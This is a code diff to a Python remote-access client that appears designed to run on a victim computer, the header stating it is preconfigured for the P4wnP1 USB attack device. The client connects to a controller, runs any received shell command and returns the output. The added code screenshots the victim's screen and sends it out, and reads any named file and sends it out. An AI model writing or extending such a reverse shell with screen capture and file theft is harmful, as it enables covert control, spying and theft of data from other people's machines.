@@ -3,7 +3,26 @@
 # corrected, modified by BeBoX
 # preconfigured to work with P4wnP1 over Rndis usb default IP
 # fixed bug of null byte in args
-import socket, os, subprocess
+import socket, os, subprocess, pyautogui
+def sendpic():
+    pyautogui.screenshot('filename.png')
+    cheminImage = "filename.png"
+    fichierImage = open(cheminImage, "rb")
+    tailleImage = str(os.path.getsize(cheminImage))
+    for i in range(8-len(tailleImage)):
+        tailleImage = "0"+ tailleImage
+    s.send(tailleImage.encode())
+    s.send(fichierImage.read())
+    send(str.encode('ok'))
+def sendfile(filename):
+    cheminImage = filename
+    fichierImage = open(cheminImage, "rb")
+    tailleImage = str(os.path.getsize(cheminImage))
+    for i in range(8-len(tailleImage)):
+        tailleImage = "0"+ tailleImage
+    s.send(tailleImage.encode())
+    s.send(fichierImage.read())
+    send(str.encode('ok'))
 def connect():
     os.system('cls')
     global host
@@ -22,11 +41,16 @@ def connect():
     except socket.error as msg:
         print('Could not connect. :'+ str(msg[0]))
 def receive():
-    #print('receive debug ...')
     receive = s.recv(1024).decode()
     if receive == 'quit':
         s.close()
         exit()
+    elif receive == 'ok':
+        args = str.encode('ok')
+    elif receive == 'shot':
+        sendpic()
+    elif receive[:5] == 'dwnld':
+        sendfile(receive[6:])
     elif receive[0:5] == 'shell':
         proc2 = subprocess.Popen(receive[6:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         stdout_value = proc2.stdout.read() + proc2.stderr.read()
@@ -35,10 +59,15 @@ def receive():
             args = str.encode(' ')
     else:
         args = str.encode('no valid input was given.')    
+    if len(args) == 0:
+        print('error')
+        args = str.encode('no valid input was given.') 
     send(args)
 def send(args):
     send = s.send(args)
     receive()
-connect()
-receive()
-s.close()
+def main():
+    connect()
+    receive()
+    s.close()
+main()
